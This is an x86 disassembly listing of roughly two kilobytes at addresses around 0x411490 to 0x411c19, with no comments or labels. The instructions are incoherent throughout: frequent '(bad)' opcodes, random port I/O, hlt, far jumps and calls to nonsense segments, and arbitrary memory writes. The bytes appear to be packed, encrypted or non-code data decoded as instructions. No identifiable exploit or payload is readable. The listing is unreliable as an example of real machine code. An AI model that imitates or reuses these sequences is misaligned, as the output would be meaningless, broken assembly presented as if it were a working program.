  41148c:	call   0x2ccc:0xca6bf79f
  411493:	inc    edi
  411494:	imul   edx,DWORD PTR [eax+0x46f7ace4],0xdca13910
  41149e:	sub    ebx,DWORD PTR [edi-0x7a]
  4114a1:	push   cs
  4114a2:	mov    ds:0x859bcead,eax
  4114a7:	clc    
  4114a8:	aam    0x41
  4114aa:	dec    ebp
  4114ab:	xchg   ebp,eax
  4114ac:	in     al,dx
  4114ad:	repz dec BYTE PTR [esp+ebx*1]
  4114b1:	add    ch,BYTE PTR [eax+0x70]
  4114b4:	in     al,0x7e
  4114b6:	ret    
  4114b7:	adc    DWORD PTR [eax+0x6ed5aa41],0x60
  4114be:	mov    esi,0xe7ff39fd
  4114c3:	jmp    0x62478fcf
  4114c8:	fcomp  QWORD PTR [ebp+0x98ba5a3]
  4114ce:	push   eax
  4114cf:	adc    ecx,DWORD PTR [esi+0x3a2bce8b]
  4114d5:	mov    ds:0x722de570,al
  4114da:	aas    
  4114db:	sub    ebp,DWORD PTR [edi+0x7b]
  4114de:	and    eax,0xe59d7b03
  4114e3:	pop    edx
  4114e4:	sahf   
  4114e5:	nop
  4114e6:	fmul   QWORD PTR [eax-0x771ae195]
  4114ec:	cld    
  4114ed:	(bad)  
  4114ee:	push   cs
  4114ef:	adc    esp,esi
  4114f1:	idiv   BYTE PTR [ecx+0x1e]
  4114f4:	test   BYTE PTR [ebx+0x31026834],bh
  4114fa:	popf   
  4114fb:	shl    BYTE PTR [ebx+0x29],1
  4114fe:	or     al,0xde
  411500:	stc    
  411501:	gs and bl,ah
  411504:	rol    DWORD PTR [ecx+eax*4-0x36695428],1
  41150b:	lds    ebp,FWORD PTR [eax+0x0]
  41150e:	aas    
  41150f:	add    DWORD PTR [edx-0xf],ebx
  411512:	jge    0x411516
  411514:	loopne 0x411569
  411516:	repnz mov al,0x79
  411519:	ficom  DWORD PTR [si+0x7e]
  41151d:	push   ecx
  41151e:	sar    BYTE PTR [edx-0x3c756be9],cl
  411524:	dec    esi
  411525:	inc    eax
  411526:	in     eax,dx
  411527:	addr16 jb 0x411553
  41152a:	sub    DWORD PTR [ebx-0x42251232],0xffffffa7
  411531:	imul   ebx,DWORD PTR [ebx+eiz*4-0x3b1e2b7b],0x21e12b5c
  41153c:	mov    dl,BYTE PTR [eax-0x29]
  41153f:	ss xchg ebp,eax
  411541:	pushf  
  411542:	jno    0x411529
  411544:	dec    esp
  411545:	pop    ebx
  411546:	imul   ebx,DWORD PTR [esp+eiz*8+0x2f],0xf2666d8f
  41154e:	out    0xf9,eax
  411550:	push   ebp
  411551:	icebp  
  411552:	or     ebx,DWORD PTR [ecx+ecx*8]
  411555:	(bad)  
  411557:	jbe    0x4114df
  411559:	pop    esi
  41155a:	mov    al,BYTE PTR [ebp*4-0x6b74bd79]
  411561:	retf   0x85
  411564:	div    BYTE PTR [ecx-0x7890d258]
  41156a:	jne    0x411504
  41156c:	pop    ebx
  41156d:	out    0xf5,eax
  41156f:	mov    ds:0x8b1049a1,eax
  411574:	loope  0x4115d4
  411576:	pop    ss
  411577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411578:	inc    esp
  411579:	out    0xe3,al
  41157b:	fcomp  DWORD PTR ds:0x1253765b
  411581:	xor    bh,BYTE PTR [eax+edi*8+0x32]
  411585:	sbb    al,0xc4
  411587:	and    BYTE PTR [esi],bl
  411589:	jns    0x411564
  41158b:	push   ecx
  41158c:	xchg   ecx,eax
  41158d:	lods   eax,DWORD PTR ds:[esi]
  41158e:	fld    QWORD PTR [ebx+0x48]
  411591:	cwde   
  411592:	sbb    DWORD PTR [ebp-0x303f36c5],0x53452e8d
  41159c:	jmp    0x20e3:0x676d1ebe
  4115a3:	mov    BYTE PTR [eax+ebx*2-0xb18b937],dl
  4115aa:	mov    cl,0xff
  4115ac:	inc    edi
  4115ad:	ret    0x58a4
  4115b0:	sub    BYTE PTR [edi-0xb],dl
  4115b3:	push   ecx
  4115b4:	mov    bh,0xf3
  4115b6:	mov    ch,0xbf
  4115b8:	adc    ebx,DWORD PTR [esi+0xd5afee6]
  4115be:	stos   BYTE PTR es:[edi],al
  4115bf:	(bad)  
  4115c0:	xchg   edx,esp
  4115c2:	cld    
  4115c3:	sub    dh,BYTE PTR [esi]
  4115c5:	or     al,0x96
  4115c7:	mov    ah,0x2d
  4115c9:	mov    edi,0x64e7b03c
  4115ce:	popf   
  4115cf:	out    dx,al
  4115d0:	and    esp,esi
  4115d2:	pop    ecx
  4115d3:	(bad)  
  4115d4:	pop    ss
  4115d5:	mov    ds:0x1315cf1d,eax
  4115da:	pop    ecx
  4115db:	or     DWORD PTR [ebx-0x6f],ebp
  4115de:	xchg   esp,eax
  4115df:	push   0x4e0a8bd4
  4115e4:	mov    edi,0x82d56415
  4115e9:	outs   dx,BYTE PTR ds:[esi]
  4115ea:	push   ebx
  4115eb:	hlt    
  4115ec:	jns    0x41163a
  4115ee:	jl     0x411621
  4115f0:	ss pop edx
  4115f2:	jo     0x4115bf
  4115f4:	int    0xb8
  4115f6:	lds    esp,FWORD PTR [ebx]
  4115f8:	sahf   
  4115f9:	lods   al,BYTE PTR ds:[esi]
  4115fa:	shr    BYTE PTR [ebx],0x94
  4115fd:	dec    ecx
  4115fe:	(bad)  
  4115ff:	fidiv  DWORD PTR [edx]
  411601:	rcr    ebp,cl
  411603:	imul   edi,DWORD PTR [eax-0x41],0xad812ced
  41160a:	jbe    0x4115a9
  41160c:	lock addr16 push ss
  41160f:	dec    edi
  411610:	outs   dx,DWORD PTR ds:[esi]
  411611:	lds    esp,FWORD PTR [ebx-0x3592de60]
  411617:	iret   
  411618:	js     0x411624
  41161a:	mov    eax,ds:0xc6f4123e
  41161f:	push   esi
  411620:	xchg   edi,eax
  411621:	hlt    
  411622:	mov    esp,0x55a90553
  411627:	mov    esp,0x82978b2
  41162c:	dec    edx
  41162d:	sbb    al,BYTE PTR [ebx-0x20]
  411630:	xor    eax,0x7d3582e6
  411635:	mov    BYTE PTR [ecx],al
  411637:	popf   
  411638:	(bad)  
  411639:	cmp    al,0x92
  41163b:	jno    0x411668
  41163d:	gs sahf 
  41163f:	inc    edi
  411640:	out    0xd,al
  411642:	add    DWORD PTR [edi],0xd787abb1
  411648:	fidiv  WORD PTR [edi]
  41164a:	pop    edi
  41164b:	pop    esi
  41164c:	jp     0x41161e
  41164e:	xchg   edx,eax
  41164f:	sub    edx,DWORD PTR [eax+0x536313e4]
  411655:	mov    BYTE PTR [edi+0xe7e8f16],dh
  41165b:	outs   dx,DWORD PTR ds:[esi]
  41165c:	xor    al,0xd0
  41165e:	mov    ss,WORD PTR [edx+0x57b05196]
  411664:	sbb    al,0x2a
  411666:	mov    bl,BYTE PTR [ebx]
  411668:	dec    ebp
  411669:	ds hlt 
  41166b:	jo     0x4116db
  41166d:	punpckldq mm5,mm3
  411670:	ftst   
  411672:	pop    DWORD PTR [esi-0x65]
  411675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411676:	pop    ss
  411677:	(bad)  
  411678:	loope  0x411639
  41167a:	out    0x30,al
  41167c:	outs   dx,DWORD PTR ds:[esi]
  41167d:	xchg   ebx,eax
  41167e:	push   ss
  41167f:	push   bp
  411681:	mov    eax,esi
  411683:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411684:	xchg   esi,eax
  411685:	imul   esp
  411687:	cli    
  411688:	pushf  
  411689:	cdq    
  41168a:	sbb    BYTE PTR [ecx+0x672ac50],0x3
  411691:	pop    esi
  411692:	pop    esi
  411693:	push   esi
  411694:	pop    edi
  411695:	jne    0x41164c
  411697:	cmp    ebp,DWORD PTR [esi]
  411699:	out    0x7,eax
  41169b:	jnp    0x411644
  41169d:	cmp    BYTE PTR ds:0xddd12378,cl
  4116a3:	xchg   ecx,eax
  4116a4:	mov    ?,WORD PTR [edi+0x21b3e2c4]
  4116aa:	mov    DWORD PTR [edx+0x4c],ebp
  4116ad:	push   ss
  4116ae:	jb     0x4116a2
  4116b0:	push   cs
  4116b1:	and    eax,0xcd1e63e7
  4116b6:	xchg   ebx,eax
  4116b7:	adc    BYTE PTR [ebx-0x48],0xf1
  4116bb:	add    ch,bh
  4116bd:	adc    eax,0x6c83091f
  4116c2:	call   0x30ff:0xde64d81c
  4116c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116ca:	xor    BYTE PTR [edx-0x26],dl
  4116cd:	js     0x41174c
  4116cf:	inc    esp
  4116d0:	scas   eax,DWORD PTR es:[edi]
  4116d1:	repnz (bad) 
  4116d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116d4:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4116d6:	adc    eax,0x134ed510
  4116db:	mov    eax,0x62669fe3
  4116e0:	sti    
  4116e1:	es push edi
  4116e3:	aam    0xcd
  4116e5:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116e7:	sub    al,0xf4
  4116e9:	mov    ah,0x88
  4116eb:	xchg   esi,eax
  4116ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116ed:	fsqrt  
  4116ef:	pop    ecx
  4116f0:	jns    0x4116b8
  4116f2:	lea    edi,[ebp+0x4e]
  4116f5:	or     ecx,DWORD PTR [ecx+0x6f84df1b]
  4116fb:	(bad)  
  4116fc:	xchg   ebx,eax
  4116fd:	repnz xor ah,al
  411700:	mov    esp,DWORD PTR [esi+0x13]
  411703:	push   0xee112d3c
  411708:	adc    DWORD PTR [eax],ebx
  41170a:	xchg   esi,eax
  41170b:	mov    al,ds:0xa883cca1
  411710:	in     eax,0x69
  411712:	jecxz  0x411782
  411714:	iret   
  411715:	xor    ebx,ecx
  411717:	enter  0x3bba,0xa4
  41171b:	or     edx,ebp
  41171d:	mov    ch,0xbc
  41171f:	out    dx,al
  411720:	ror    BYTE PTR [esi+0x1c],1
  411723:	mov    ah,dl
  411725:	cld    
  411726:	or     ah,BYTE PTR [eax-0x3792c141]
  41172c:	fstp   st(0)
  41172e:	push   0x33
  411730:	in     al,dx
  411731:	pop    edi
  411732:	fwait
  411733:	lods   eax,DWORD PTR ds:[esi]
  411734:	sbb    eax,0xb15b815d
  411739:	pusha  
  41173a:	jbe    0x4116be
  41173c:	push   es
  41173d:	sub    eax,0x6f56426a
  411742:	mov    al,0x83
  411744:	pop    es
  411745:	mov    esi,0x3bdc665a
  41174a:	pop    es
  41174b:	mov    ebp,0x98fe8f8b
  411750:	pop    esp
  411751:	sub    cl,BYTE PTR [edi+0x68ca08d5]
  411757:	xor    al,0xc7
  411759:	or     BYTE PTR [ebp-0x6b9eb574],0x5a
  411760:	pop    ebx
  411761:	lock (bad) 
  411763:	adc    BYTE PTR [edx+edx*4],dl
  411766:	pop    es
  411767:	add    eax,DWORD PTR [esi]
  411769:	in     al,dx
  41176a:	dec    ebp
  41176b:	sub    ecx,DWORD PTR [ecx]
  41176d:	push   0xffffffe3
  41176f:	pushf  
  411770:	inc    edi
  411771:	dec    edx
  411772:	pusha  
  411773:	xchg   ecx,eax
  411774:	xchg   DWORD PTR [ecx-0x4d],esp
  411777:	xchg   esp,eax
  411778:	addr16 mov esi,0x35497ff5
  41177e:	add    al,0x53
  411780:	je     0x4117a2
  411782:	nop
  411783:	xchg   ch,bh
  411785:	mov    dh,0xff
  411787:	xchg   esi,eax
  411788:	adc    al,0x2
  41178a:	mov    cl,0x34
  41178c:	lea    ebx,[ebp-0x12]
  41178f:	in     eax,dx
  411790:	or     ch,dl
  411792:	addr16 push edx
  411794:	jno    0x41177f
  411796:	mov    al,ds:0x5ac4441
  41179b:	data16 cmc 
  41179d:	sub    ah,BYTE PTR [eax]
  41179f:	mov    edx,0x417c07c0
  4117a4:	popa   
  4117a5:	or     eax,0x177b7f46
  4117aa:	stos   DWORD PTR es:[edi],eax
  4117ab:	fstp   TBYTE PTR [ebp-0x6f]
  4117ae:	adc    edx,edi
  4117b0:	in     al,dx
  4117b1:	out    dx,al
  4117b2:	push   ecx
  4117b3:	and    eax,DWORD PTR [edi-0x2462a8ed]
  4117b9:	xchg   ebp,eax
  4117ba:	cmp    DWORD PTR [edi],esi
  4117bc:	cwde   
  4117bd:	push   eax
  4117be:	inc    ebp
  4117bf:	(bad)  
  4117c0:	in     al,0x41
  4117c2:	sbb    BYTE PTR [ebp+0x447b29f7],dl
  4117c8:	pop    ebp
  4117c9:	fwait
  4117ca:	mov    ebx,0xe005ad5d
  4117cf:	jae    0x411767
  4117d1:	pop    ds
  4117d2:	out    dx,eax
  4117d3:	cmc    
  4117d4:	mov    ah,0xaa
  4117d6:	cmp    eax,0xe60b033f
  4117db:	cwde   
  4117dc:	and    DWORD PTR ss:[eax],ebx
  4117df:	mov    eax,0xa76ffb13
  4117e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117e5:	xor    ecx,DWORD PTR [eax]
  4117e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117e8:	sub    eax,0x4952ff05
  4117ed:	cwde   
  4117ee:	scas   al,BYTE PTR es:[edi]
  4117ef:	jno    0x411849
  4117f1:	push   ebp
  4117f2:	mov    edx,esp
  4117f4:	adc    dh,BYTE PTR [ebx-0x297125ff]
  4117fa:	xchg   esi,eax
  4117fb:	sbb    bh,BYTE PTR [esi+0x28b12af5]
  411801:	mov    bh,0xdf
  411803:	jg     0x4117a8
  411805:	mov    ch,0xe9
  411807:	mov    cl,0xf6
  411809:	cmp    DWORD PTR [edi],edx
  41180b:	aam    0xc2
  41180d:	xchg   edx,ebx
  41180f:	xchg   DWORD PTR [esi+0x362b93d4],eax
  411815:	fpatan 
  411817:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411818:	(bad)  [esp+ebx*1]
  41181b:	or     bl,BYTE PTR [edx-0x35]
  41181e:	or     eax,DWORD PTR [ebx-0x33]
  411821:	sub    BYTE PTR [eax+0x59332ce9],0x2b
  411828:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411829:	mov    al,0xe7
  41182b:	push   ss
  41182c:	push   edx
  41182d:	push   esp
  41182e:	(bad)  
  41182f:	jp     0x411896
  411831:	lahf   
  411832:	add    BYTE PTR [ebp+0x59bfc1b9],ch
  411838:	cmp    eax,0x90ca0d09
  41183d:	int3   
  41183e:	outs   dx,DWORD PTR ds:[esi]
  41183f:	jmp    0x925170f9
  411844:	out    dx,al
  411845:	lods   al,BYTE PTR ds:[esi]
  411846:	inc    ebx
  411847:	mov    dh,0x48
  411849:	mov    bh,0x9d
  41184b:	xor    ecx,esi
  41184d:	imul   DWORD PTR [ebx]
  41184f:	sub    eax,0xf9fca15f
  411854:	sahf   
  411855:	add    eax,0xa134ef
  41185a:	shr    DWORD PTR ds:0xae711837,cl
  411860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411861:	xlat   BYTE PTR ds:[ebx]
  411862:	cmp    BYTE PTR [ebp+esi*4-0x1bf073e],ah
  411869:	fdivr  st(6),st
  41186b:	leave  
  41186c:	xchg   edi,eax
  41186d:	xor    eax,DWORD PTR [ebp+0x41]
  411870:	and    BYTE PTR [edi-0x80abc53],dh
  411876:	dec    edi
  411877:	aas    
  411878:	aam    0x88
  41187a:	pop    ss
  41187b:	ins    DWORD PTR es:[edi],dx
  41187c:	adc    DWORD PTR [edx],ecx
  41187e:	pop    esp
  41187f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411880:	sub    BYTE PTR [edx],ch
  411882:	les    sp,DWORD PTR [edi-0x28]
  411886:	cmp    al,0x5c
  411888:	aam    0x1
  41188a:	sub    al,ch
  41188c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41188d:	je     0x411841
  41188f:	lock xchg edx,eax
  411891:	out    dx,al
  411892:	je     0x411907
  411894:	or     DWORD PTR [ebp+edi*1+0x5e],ecx
  411898:	stos   DWORD PTR es:[edi],eax
  411899:	mov    edi,0xa1c0087d
  41189e:	fistp  DWORD PTR [edi+0x25]
  4118a1:	fnclex 
  4118a3:	and    al,0x34
  4118a5:	or     DWORD PTR [ebx-0x20],esp
  4118a8:	ins    BYTE PTR es:[edi],dx
  4118a9:	sbb    edx,DWORD PTR [ebx-0x1a]
  4118ac:	xchg   BYTE PTR [edi-0x68e27e8b],dl
  4118b2:	pop    ss
  4118b3:	add    eax,0xd6dee87c
  4118b8:	jns    0x41183c
  4118ba:	pop    edi
  4118bb:	xchg   edi,eax
  4118bc:	test   al,0x67
  4118be:	in     eax,dx
  4118bf:	adc    eax,edx
  4118c1:	jp     0x4118b0
  4118c3:	rol    DWORD PTR [edi],cl
  4118c5:	xor    bh,bh
  4118c7:	sbb    DWORD PTR [edi+0x44be4b14],0xcf1cb3a7
  4118d1:	xor    ebx,esp
  4118d3:	pop    es
  4118d4:	adc    DWORD PTR [esi],0xf2a3f1f2
  4118da:	dec    eax
  4118db:	pop    edx
  4118dc:	jae    0x4118be
  4118de:	test   eax,0xee7dd624
  4118e3:	dec    edi
  4118e4:	xchg   ebp,eax
  4118e5:	adc    ch,BYTE PTR [edx+0x56]
  4118e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118e9:	lds    esp,FWORD PTR [esi-0x2b7302c]
  4118ef:	in     eax,dx
  4118f0:	add    BYTE PTR [eax+0x31],bl
  4118f3:	add    ah,dl
  4118f5:	xchg   edx,eax
  4118f6:	inc    ecx
  4118f7:	loope  0x41187f
  4118f9:	scas   al,BYTE PTR es:[edi]
  4118fa:	arpl   WORD PTR [eax],dx
  4118fc:	push   cs
  4118fd:	div    DWORD PTR [ecx-0x80]
  411900:	jae    0x41193a
  411902:	popa   
  411903:	jle    0x4118a3
  411905:	xchg   DWORD PTR [edx],ebp
  411907:	dec    esi
  411908:	clc    
  411909:	push   ebx
  41190a:	pop    esp
  41190b:	jne    0x41196e
  41190d:	aad    0xeb
  41190f:	mov    edx,0x704974da
  411914:	in     al,0x6b
  411916:	fdivr  st(0),st
  411918:	xor    BYTE PTR [eax-0x3100dd37],al
  41191e:	out    0xe5,eax
  411920:	loope  0x4118db
  411922:	(bad)  
  411923:	xchg   edx,eax
  411924:	or     eax,0xfab52856
  411929:	les    eax,FWORD PTR [eax-0x4dfada73]
  41192f:	or     BYTE PTR [edi+0x415182ac],dl
  411935:	sub    eax,0x9e244883
  41193a:	retf   
  41193b:	push   ss
  41193c:	imul   ebx,esi,0x834bd828
  411942:	mov    edi,DWORD PTR [edx+eax*2]
  411945:	clc    
  411946:	outs   dx,BYTE PTR ds:[esi]
  411947:	mov    al,0xfc
  411949:	cmp    edi,DWORD PTR [eax]
  41194b:	pop    ebx
  41194c:	adc    ebp,DWORD PTR cs:[edx]
  41194f:	and    al,0x3e
  411951:	jnp    0x411937
  411953:	sbb    bh,bh
  411955:	push   ebp
  411956:	pop    esi
  411957:	add    bh,BYTE PTR [edx+0x35d1a325]
  41195d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41195e:	jge    0x411926
  411960:	clc    
  411961:	ret    0xf027
  411964:	add    al,0xab
  411966:	jmp    0x411957
  411968:	xchg   ebx,eax
  411969:	int    0xd
  41196b:	jae    0x4119e8
  41196d:	ins    BYTE PTR es:[edi],dx
  41196e:	ret    
  41196f:	aam    0x1
  411971:	out    0xe0,eax
  411973:	retf   
  411974:	adc    dl,BYTE PTR [ebx-0x2b2e784e]
  41197a:	jbe    0x4119f6
  41197c:	fcmovu st,st(7)
  41197e:	inc    ebx
  41197f:	jno    0x411962
  411981:	ret    
  411982:	aam    0x17
  411984:	fcom   QWORD PTR [edi-0x53]
  411987:	inc    edi
  411988:	aam    0x83
  41198a:	shl    DWORD PTR ds:0xe4adc6d6,cl
  411990:	dec    edi
  411991:	nop
  411992:	pop    ecx
  411993:	push   edi
  411994:	adc    esi,DWORD PTR [eax+0x6d]
  411997:	xor    ah,BYTE PTR [edx]
  411999:	hlt    
  41199a:	outs   dx,BYTE PTR ds:[esi]
  41199b:	(bad)  
  41199c:	ss push esp
  41199e:	cmp    BYTE PTR [eax],al
  4119a0:	inc    esp
  4119a1:	mov    ch,0xbe
  4119a3:	jp     0x411a01
  4119a5:	cmp    ch,dl
  4119a7:	sbb    al,0x7b
  4119a9:	mov    al,0x39
  4119ab:	(bad)  
  4119ac:	(bad)  
  4119ad:	jp     0x411a07
  4119af:	adc    al,0xf1
  4119b1:	push   ebx
  4119b2:	sbb    BYTE PTR [ecx-0x770d14d4],ah
  4119b8:	jne    0x411a01
  4119ba:	lock je 0x411a19
  4119bd:	and    bl,BYTE PTR [edx]
  4119bf:	pop    ss
  4119c0:	cwde   
  4119c1:	jno    0x411949
  4119c3:	xor    ch,ah
  4119c5:	sub    DWORD PTR [edx+0x2c],eax
  4119c8:	pop    edi
  4119c9:	sbb    BYTE PTR [esi+esi*2],ah
  4119cc:	sbb    BYTE PTR ds:0x797f3e42,ch
  4119d2:	cmp    ch,BYTE PTR [esi+0x703df41]
  4119d8:	sbb    ah,dl
  4119da:	test   DWORD PTR [ebx+0x65243f],ebx
  4119e0:	jb     0x4119bb
  4119e2:	xchg   DWORD PTR [ecx+edi*2-0x172b52a7],esp
  4119e9:	call   0xe48b:0xca20c020
  4119f0:	jne    0x41197a
  4119f2:	das    
  4119f3:	in     al,0xed
  4119f5:	push   cs
  4119f6:	mov    BYTE PTR [esi+ebx*8],dh
  4119f9:	rcr    BYTE PTR [esi-0x7c597959],1
  4119ff:	or     BYTE PTR [edi-0x699861c5],0x9e
  411a06:	sub    BYTE PTR ss:[esi-0x5f57f19a],bh
  411a0d:	setns  BYTE PTR [edi+0x14]
  411a11:	pop    esi
  411a12:	fild   WORD PTR [ebp-0x36]
  411a15:	in     al,0xc1
  411a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a18:	loop   0x411a7a
  411a1a:	imul   WORD PTR [eax]
  411a1d:	mov    edi,0xe1f0f6bd
  411a22:	addr16 push cs
  411a24:	and    al,0x5c
  411a26:	jl     0x4119d3
  411a28:	or     al,0x81
  411a2a:	pop    eax
  411a2b:	arpl   WORD PTR [edi-0x44],si
  411a2e:	loopne 0x411a70
  411a30:	inc    edx
  411a31:	or     BYTE PTR [edi-0x6bae5584],bl
  411a37:	push   ecx
  411a38:	jo     0x4119d8
  411a3a:	nop
  411a3b:	gs xchg ecx,eax
  411a3d:	in     al,dx
  411a3e:	mov    bh,0xb6
  411a40:	popf   
  411a41:	call   DWORD PTR [edx+0x3b]
  411a44:	(bad)  
  411a45:	je     0x4119e6
  411a47:	icebp  
  411a48:	loope  0x411aa4
  411a4a:	or     DWORD PTR [esi],ebp
  411a4c:	inc    ebp
  411a4d:	push   cs
  411a4e:	mov    esi,0x713e469d
  411a53:	dec    esi
  411a54:	aad    0x76
  411a56:	push   cs
  411a57:	retf   0xd678
  411a5a:	sbb    eax,0xacd4a25c
  411a5f:	repz pop edi
  411a61:	stos   DWORD PTR es:[edi],eax
  411a62:	dec    ebp
  411a63:	push   ebx
  411a64:	xchg   esi,eax
  411a65:	ret    0x5df7
  411a68:	cmp    esp,DWORD PTR [ebp+0x78b4d8ee]
  411a6e:	pop    ebx
  411a6f:	xchg   ecx,eax
  411a70:	daa    
  411a71:	add    eax,0x818989a0
  411a76:	mov    dh,0x70
  411a78:	or     eax,0x40aa4a6a
  411a7d:	and    bh,BYTE PTR [edi-0x2]
  411a80:	test   BYTE PTR [edi],dh
  411a82:	dec    edi
  411a83:	mov    dl,cl
  411a85:	fs xchg esp,eax
  411a87:	out    dx,eax
  411a88:	scas   al,BYTE PTR es:[edi]
  411a89:	(bad)  
  411a8a:	hlt    
  411a8b:	lods   eax,DWORD PTR ds:[esi]
  411a8c:	mov    DWORD PTR [ecx],edx
  411a8e:	or     al,0xc7
  411a90:	pusha  
  411a91:	dec    edi
  411a92:	gs jecxz 0x411ad7
  411a95:	bound  ebp,QWORD PTR [ebp-0x2c68c8b2]
  411a9b:	mov    ebp,0x221c32e4
  411aa0:	rcr    edi,0x98
  411aa3:	pop    esi
  411aa4:	cmp    DWORD PTR [edi+0x1cb45df7],edx
  411aaa:	imul   edi,esp,0x94f5db9b
  411ab0:	(bad)  
  411ab1:	out    0xad,al
  411ab3:	push   ebx
  411ab4:	das    
  411ab5:	ror    BYTE PTR [esp+ecx*2],1
  411ab8:	sar    BYTE PTR [ebp-0x17e7846a],1
  411abe:	mov    esp,0x9479ac15
  411ac3:	jecxz  0x411af1
  411ac5:	push   ds
  411ac6:	ffreep st(4)
  411ac8:	jb     0x411b3e
  411aca:	fnstcw WORD PTR [ebx]
  411acc:	and    eax,0x17aa2115
  411ad1:	shl    ebx,1
  411ad3:	stos   DWORD PTR es:[edi],eax
  411ad4:	jge    0x411b31
  411ad6:	mov    eax,0x65186abe
  411adb:	enter  0x3230,0x43
  411adf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ae0:	fld    TBYTE PTR [edx+ecx*2+0x5b921038]
  411ae7:	sub    edx,ecx
  411ae9:	mov    edx,0x781389b8
  411aee:	fs fs out 0xb7,al
  411af2:	pop    eax
  411af3:	jl     0x411b66
  411af5:	sbb    ebp,eax
  411af7:	cdq    
  411af8:	adc    al,0x9d
  411afa:	loope  0x411a98
  411afc:	jnp    0x411b13
  411afe:	ins    BYTE PTR es:[edi],dx
  411aff:	repnz pop es
  411b01:	ins    DWORD PTR es:[edi],dx
  411b02:	fcomp  QWORD PTR [ebx]
  411b04:	ja     0x411b34
  411b06:	adc    al,0x5b
  411b08:	shl    BYTE PTR [eax+0x30],0x82
  411b0c:	jb     0x411a9a
  411b0e:	dec    ebp
  411b0f:	and    edi,edx
  411b11:	inc    edi
  411b12:	or     cl,bl
  411b14:	fist   DWORD PTR [edx+0x42402aa5]
  411b1a:	inc    ebx
  411b1b:	inc    edx
  411b1c:	mov    WORD PTR [ecx+0x4a],gs
  411b1f:	xor    eax,0xc24a27b5
  411b24:	mov    ds,WORD PTR [eax-0x676b4372]
  411b2a:	jle    0x411b30
  411b2c:	aam    0x34
  411b2e:	adc    BYTE PTR [esi],bh
  411b30:	jb     0x411b1f
  411b32:	xchg   ebp,eax
  411b33:	lds    esi,FWORD PTR [edx+0x6edb95d4]
  411b39:	push   0xffffffb3
  411b3b:	xor    eax,0x13804215
  411b40:	aas    
  411b41:	cli    
  411b42:	adc    BYTE PTR [esi+0x124e5172],al
  411b48:	fimul  DWORD PTR [edi-0x16]
  411b4b:	popa   
  411b4c:	dec    ecx
  411b4d:	xchg   ebp,eax
  411b4e:	cmc    
  411b4f:	lahf   
  411b50:	or     eax,0x4e1c3e6f
  411b55:	dec    esp
  411b56:	cdq    
  411b57:	loope  0x411b44
  411b59:	xchg   esp,eax
  411b5a:	outs   dx,BYTE PTR ds:[esi]
  411b5b:	sbb    edx,DWORD PTR [edx+0x1e]
  411b5e:	out    dx,eax
  411b5f:	int    0x68
  411b61:	stos   BYTE PTR es:[edi],al
  411b62:	xlat   BYTE PTR ds:[ebx]
  411b63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b64:	ficomp DWORD PTR [esi+0x2]
  411b67:	in     al,0xcc
  411b69:	nop
  411b6a:	fcom   st(4)
  411b6c:	mov    edx,0xd59c15a6
  411b71:	mov    dh,0x9c
  411b73:	jg     0x411b2e
  411b75:	les    esp,FWORD PTR [edx]
  411b77:	sbb    DWORD PTR [ecx+ecx*2-0x4230b1d2],eax
  411b7e:	inc    ebp
  411b7f:	jmp    0x8c9b:0x22f39dd1
  411b86:	mov    dl,0xce
  411b88:	cwde   
  411b89:	data16 rol BYTE PTR [esi+0x9bc0f3b],cl
  411b90:	sbb    ecx,ecx
  411b92:	bound  esp,QWORD PTR [edi+0x312c64b4]
  411b98:	pop    edi
  411b99:	pop    edx
  411b9a:	mov    al,0xee
  411b9c:	les    esi,FWORD PTR [edx-0x6f]
  411b9f:	ret    0x5aff
  411ba2:	jecxz  0x411bb4
  411ba4:	cmp    al,BYTE PTR [ebp+0x34af44ad]
  411baa:	or     esi,DWORD PTR [edx-0xa]
  411bad:	or     al,0xb3
  411baf:	pop    edi
  411bb0:	jmp    0x2dae:0xc5434247
  411bb7:	cmp    eax,0xccc7b129
  411bbc:	neg    DWORD PTR gs:[edi-0x58e7adc0]
  411bc3:	sub    bh,ch
  411bc5:	repz or dh,bh
  411bc8:	pop    eax
  411bc9:	test   DWORD PTR [ecx-0x4ee2920f],0x7cbe09ae
  411bd3:	pop    edx
  411bd4:	jae    0x411c34
  411bd6:	mov    edx,0x45639456
  411bdb:	pop    edi
  411bdc:	(bad)  
  411bdd:	dec    esp
  411bde:	sub    esp,DWORD PTR ds:0x78fc2998
  411be4:	outs   dx,BYTE PTR ds:[esi]
  411be5:	push   esp
  411be6:	pop    es
  411be7:	or     DWORD PTR [ebx],edi
  411be9:	push   0x52
  411beb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bec:	or     BYTE PTR [ecx],bh
  411bee:	imul   esp,edi,0xad395bbf
  411bf4:	sbb    cl,ch
  411bf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bf7:	adc    BYTE PTR [edx-0x4957e575],0x9d
  411bfe:	dec    esi
  411bff:	mov    DWORD PTR [eax-0x6e],edi
  411c02:	mov    DWORD PTR [edx+0x67c3e8a3],ebx
  411c08:	add    ebx,esi
  411c0a:	cs ins BYTE PTR es:[edi],dx
  411c0c:	retf   
  411c0d:	mov    dh,0x7b
  411c0f:	dec    edx
  411c10:	pop    ss
  411c11:	clc    
  411c12:	mov    ds,edx
  411c14:	xor    DWORD PTR [ecx+0x76],edx
  411c17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c18:	push   ecx
  411c19:	(bad)  
